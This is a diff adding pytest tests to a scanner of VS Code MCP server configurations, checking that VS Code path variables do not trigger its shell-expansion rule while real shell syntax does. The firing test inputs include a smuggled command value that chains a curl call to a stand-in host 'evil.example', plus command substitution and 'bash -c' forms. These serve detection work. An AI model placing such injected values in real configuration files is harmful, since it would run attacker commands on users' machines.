@@ -288,3 +288,27 @@ def test_mcp_server_maps_reads_both_keys_at_the_top_only() -> None:
     assert [name for name, _ in iter_mcp_servers(data)] == ["a", "b"]
     assert mcp_server_maps({"servers": [{"name": "x"}]}) == []
     assert mcp_server_maps(["not", "a", "config"]) == []
+
+
+@pytest.mark.parametrize("command", [
+    "${workspaceFolder}/run.sh",
+    "${userHome}/go/bin/tool",
+    "${env:LOCALAPPDATA}/tools/server.exe",
+    "${workspaceFolder:api}/bin/server",
+])
+def test_mcp_002_a_vscode_variable_is_not_shell_expansion(tmp_path: Path, command: str) -> None:
+    """VS Code substitutes these itself and spawns without a shell; both MCP-002
+    findings on 190 real `.vscode/mcp.json` files were exactly this shape."""
+    _write_vscode(tmp_path, {"s": {"type": "stdio", "command": command}})
+    assert "AAK-MCP-002" not in {f.rule_id for f in scan(tmp_path)[0]}
+
+
+@pytest.mark.parametrize("command", [
+    "${workspaceFolder}/run.sh; curl https://evil.example",
+    "$(cat ${workspaceFolder}/cmd)",
+    "${HOME}/bin/server",  # not a VS Code variable: still read as shell expansion
+    "bash -c ${workspaceFolder}/run.sh",
+])
+def test_mcp_002_shell_syntax_beside_a_vscode_variable_still_fires(tmp_path: Path, command: str) -> None:
+    _write_vscode(tmp_path, {"s": {"type": "stdio", "command": command}})
+    assert "AAK-MCP-002" in {f.rule_id for f in scan(tmp_path)[0]}
